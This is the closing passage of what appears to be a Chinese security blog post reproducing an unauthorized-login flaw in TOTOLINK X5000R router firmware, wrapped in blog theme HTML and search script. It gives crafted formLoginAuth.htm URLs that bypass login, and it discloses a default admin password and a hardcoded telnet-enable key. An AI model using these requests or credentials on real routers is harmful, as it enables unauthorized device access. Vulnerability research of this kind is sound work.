+/formLoginAuth.htm?authCode<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span><span class="token assign-left variable">userName</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">goURL</span><span class="token operator">=</span>login.html<span class="token operator">&amp;</span><span class="token assign-left variable">action</span><span class="token operator">=</span>login
+<span class="token comment">#修改：</span>
+/formLoginAuth.htm?authCode<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">userName</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">action</span><span class="token operator">=</span>login
+<span class="token comment">#或者：</span>
+/formLoginAuth.htm?authCode<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">userName</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">goURL</span><span class="token operator">=</span>home.html<span class="token operator">&amp;</span><span class="token assign-left variable">action</span><span class="token operator">=</span>login</code></pre>
+
+<p>测一下：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311221803141.png" alt="image-20231122180316108"></p>
+<p>成功未授权登陆：&#x2F;basic&#x2F;index.html</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311221804837.png" alt="image-20231122180446783"></p>
+<h3 id="新版本固件测试"><a href="#新版本固件测试" class="headerlink" title="新版本固件测试"></a>新版本固件测试</h3><p>同样的方法模拟固件，启动Web服务，直接测试旧版本固件未授权访问URL：</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.5.12&#x2F;formLoginAuth.htm?authCode&#x3D;1&amp;userName&#x3D;&amp;action&#x3D;login</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408191021088.png" alt="image-20240819102123041"></p>
+<p>尝试登陆抓包试试看与旧版本固件有什么区别：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408191034463.png" alt="image-20240819103454407"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408191034136.png" alt="image-20240819103418093"></p>
+<p>默认就采用了admin用户，但是返回并没有像旧版本那样采用formLoginAuth.htm?</p>
+<p>在我分析cstecgi.cgi的时候无意中发现貌似可以开启telnet：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408191128238.png" alt="image-20240819112841184"></p>
+<p>并于配置中找到了新版本固件登陆的默认密码admin和开启telnet的key：KL@UHeZ0</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408191127468.png" alt="image-20240819112733412"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/08/01/%E9%9B%84%E8%BF%88%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-08-19 15:39:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                        #IOT安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/" title="路由器安全">
+                        #路由器安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2099/06/18/%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TOTOLINK-X5000R"><span class="toc-text">TOTOLINK X5000R</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-text">固件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%EF%BC%88%E6%97%A7%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E9%99%86%EF%BC%89"><span class="toc-text">漏洞验证（旧未授权登陆）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E7%89%88%E6%9C%AC%E5%9B%BA%E4%BB%B6%E6%B5%8B%E8%AF%95"><span class="toc-text">新版本固件测试</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2024 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Totolink%20X5000R%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F08%2F19%2FTotolink-X5000R-%25E6%259C%25AA%25E6%258E%2588%25E6%259D%2583%25E8%25AE%25BF%25E9%2597%25AE%25E6%25BC%258F%25E6%25B4%259E%25E5%25A4%258D%25E7%258E%25B0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/08/19/Totolink-X5000R-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
